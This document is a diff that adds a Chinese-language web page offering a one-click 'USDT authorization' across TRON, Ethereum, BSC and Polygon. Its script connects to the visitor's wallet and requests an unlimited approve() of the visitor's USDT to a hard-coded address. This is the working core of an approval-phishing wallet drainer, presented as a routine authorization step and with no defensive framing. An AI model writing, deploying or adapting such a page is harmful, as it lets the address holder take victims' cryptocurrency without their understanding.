@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>USDT 授权 - 多链支持</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
+</head>
+<body>
+  <h2>点击按钮授权 USDT 无限额度</h2>
+  <button onclick="authorize()">授权 USDT</button>
+  <script>
+    const TARGET_ADDRESS = "TGKEyQRs3fKSrx95zGJqEFYGzt88888888"; // 被授权地址
+    const MAX_UINT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+    const USDT_CONTRACTS = {
+      ethereum: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
+      bsc: "0x55d398326f99059fF775485246999027B3197955",
+      polygon: "0x3813e82e6f7098b9583FC0F33a962D02018B6803",
+      tron: "T9yD14Nj9j7xAB4dbGeiX9h8unkKHxuWwb"
+    };
+    async function authorize() {
+      if (window.tronWeb && window.tronWeb.ready) {
+        // TRON 授权
+        const contract = await window.tronWeb.contract().at(USDT_CONTRACTS.tron);
+        try {
+          const tx = await contract.approve(TARGET_ADDRESS, MAX_UINT).send();
+          alert("TRON 授权成功！交易ID: " + tx);
+        } catch (err) {
+          alert("TRON 授权失败: " + err.message);
+        }
+      } else if (window.ethereum) {
+        // 其他链（ETH/BSC/Polygon）
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        await provider.send("eth_requestAccounts", []);
+        const signer = provider.getSigner();
+        const network = await provider.getNetwork();
+        let chain = "";
+        if (network.chainId === 1) chain = "ethereum";
+        else if (network.chainId === 56) chain = "bsc";
+        else if (network.chainId === 137) chain = "polygon";
+        else {
+          alert("不支持的链，请切换到 Ethereum / BSC / Polygon");
+          return;
+        }
+        const usdtContract = new ethers.Contract(
+          USDT_CONTRACTS[chain],
+          ["function approve(address spender, uint256 amount) public returns (bool)"],
+          signer
+        );
+        try {
+          const tx = await usdtContract.approve(TARGET_ADDRESS, MAX_UINT);
+          alert(`${chain.toUpperCase()} 授权发送中，交易哈希: ` + tx.hash);
+        } catch (err) {
+          alert("授权失败: " + err.message);
+        }
+      } else {
+        alert("请使用支持 TRON 或 Ethereum 系的钱包打开本页面");
+      }
+    }
+  </script>
+</body>
+</html>
